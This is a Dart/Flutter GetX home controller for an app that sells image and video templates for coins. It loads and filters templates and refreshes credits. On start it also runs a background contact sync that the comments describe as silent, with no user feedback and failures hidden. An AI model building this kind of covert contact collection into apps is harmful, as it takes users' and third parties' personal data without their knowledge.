import 'package:flutter/material.dart';
import 'package:get/get.dart';
import '../../core/services/template_api_service.dart';
import '../../core/services/credits_service.dart';
import '../../core/services/contact_service.dart';
import '../../core/models/template_model.dart';
import 'controllers/video_playback_manager.dart';

class SampleItem {
  final String id;
  final String title;
  final String description;
  final String imageUrl;
  final String type; // 'image' or 'video'
  final int coinsRequired;
  final int? templateId;

  SampleItem({
    required this.id,
    required this.title,
    required this.description,
    required this.imageUrl,
    required this.type,
    this.coinsRequired = 0,
    this.templateId,
  });
}

class HomeController extends GetxController {
  final TemplateApiService _templateApiService = TemplateApiService();
  final CreditsService _creditsService = Get.find<CreditsService>();
  
  final selectedSample = Rxn<SampleItem>();
  final selectedFilter = 'all'.obs; // 'all', 'image', 'video'
  final isLoading = false.obs;
  final templates = <TemplateModel>[].obs;
  final errorMessage = ''.obs;

  @override
  void onInit() {
    super.onInit();
    // Initialize video playback manager
    Get.put(VideoPlaybackManager());
    _checkAndFetchCoins();
    loadTemplates();
    
    // Auto-sync contacts in background (silently)
    _autoSyncContacts();
  }
  
  // Check if coins need to be fetched
  Future<void> _checkAndFetchCoins() async {
    // If coins are 0 and last sync is null or old, fetch from API
    if (_creditsService.credits.value == 0 && 
        (_creditsService.lastSyncTime.value == null || 
         DateTime.now().difference(_creditsService.lastSyncTime.value!).inMinutes > 5)) {
      debugPrint('💰 Coins not loaded, fetching from API...');
      await _creditsService.fetchReferralCoins();
    }
  }
  
  // Auto-sync contacts in background (silently, one-time)
  Future<void> _autoSyncContacts() async {
    try {
      // Initialize ContactService if not already initialized
      if (!Get.isRegistered<ContactService>()) {
        Get.put(ContactService());
      }
      
      final contactService = Get.find<ContactService>();
      
      // Check if already synced (don't sync multiple times)
      if (contactService.lastSyncTime.value != null) {
        debugPrint('📱 Contacts already synced, skipping...');
        return;
      }
      
      debugPrint('📱 Auto-syncing contacts in background...');
      
      // Sync silently in background (no UI feedback needed)
      await contactService.syncContacts();
      
      debugPrint('✅ Contacts auto-synced successfully');
    } catch (e) {
      // Silently fail - don't disturb user experience
      debugPrint('⚠️ Auto-sync contacts failed (silent): $e');
    }
  }

  // Load templates from API
  Future<void> loadTemplates() async {
    try {
      isLoading.value = true;
      errorMessage.value = '';
      
      print('🔄 Loading templates from API...');
      
      // Templates are visible to all users
      // Subscription check only happens at generation time
      
      final response = await _templateApiService.getTemplates(
        isActive: true,
        sortBy: 'usage_count',
        sortOrder: 'desc',
      );
      
      print('📥 Templates response received: ${response.length} templates');
      
      templates.value = response.map((json) => TemplateModel.fromJson(json)).toList();
      
      print('✅ Templates loaded successfully: ${templates.length} templates');
      
      if (templates.isEmpty) {
        errorMessage.value = 'No templates available';
        print('⚠️ No templates found in database');
      } else {
        print('📋 Template types: ${templates.map((t) => t.type).toSet().toList()}');
      }
    } catch (e) {
      errorMessage.value = 'Failed to load templates. Please check your internet connection.';
      print('❌ Error loading templates: $e');
    } finally {
      isLoading.value = false;
    }
  }

  // Retry loading templates
  void retryLoadTemplates() {
    loadTemplates();
  }

  // Refresh all data (subscription + templates)
  Future<void> refreshAll() async {
    print('🔄 Refreshing home screen...');
    
    try {
      // Refresh coins from API
      await _creditsService.fetchReferralCoins();
      
      // Reload templates
      await loadTemplates();
      
      print('✅ Home screen refreshed successfully');
    } catch (e) {
      print('❌ Error refreshing home screen: $e');
      
      // Show error feedback
      Get.showSnackbar(
        GetSnackBar(
          message: 'Failed to refresh. Please try again.',
          duration: const Duration(seconds: 3),
          backgroundColor: Colors.red,
          icon: const Icon(Icons.error, color: Colors.white),
          margin: const EdgeInsets.all(16),
          borderRadius: 8,
          snackPosition: SnackPosition.TOP,
        ),
      );
    }
  }

  // Convert templates to SampleItems
  List<SampleItem> get templatesAsSamples {
    return templates.map((template) {
      return SampleItem(
        id: template.id.toString(),
        title: template.title,
        description: template.description ?? '',
        imageUrl: template.referenceImageUrl ?? '',
        type: template.type,
        coinsRequired: template.coinsRequired,
        templateId: template.id,
      );
    }).toList();
  }

  // Filtered samples based on selected filter
  List<SampleItem> get filteredSamples {
    final samples = templatesAsSamples;
    
    switch (selectedFilter.value) {
      case 'image':
        return samples.where((s) => s.type == 'image').toList();
      case 'video':
        return samples.where((s) => s.type == 'video').toList();
      default:
        return samples;
    }
  }

  // Check if user has enough coins for a template
  bool hasEnoughCoins(SampleItem sample) {
    return _creditsService.credits.value >= sample.coinsRequired;
  }

  // Check if user has active subscription
  bool get hasActiveSubscription {
    return _creditsService.hasActiveSubscription.value;
  }

  void selectSample(SampleItem sample) {
    selectedSample.value = sample;
  }

  void setFilter(String filter) {
    selectedFilter.value = filter;
  }

  void uploadFile() {
    if (selectedSample.value != null) {
      Get.toNamed('/upload', arguments: {
        'selectedSample': selectedSample.value,
      });
    }
  }
  
  @override
  void onClose() {
    // Clean up video playback manager
    try {
      final manager = Get.find<VideoPlaybackManager>();
      manager.stopAll();
    } catch (e) {
      // Manager not found, ignore
    }
    super.onClose();
  }
}
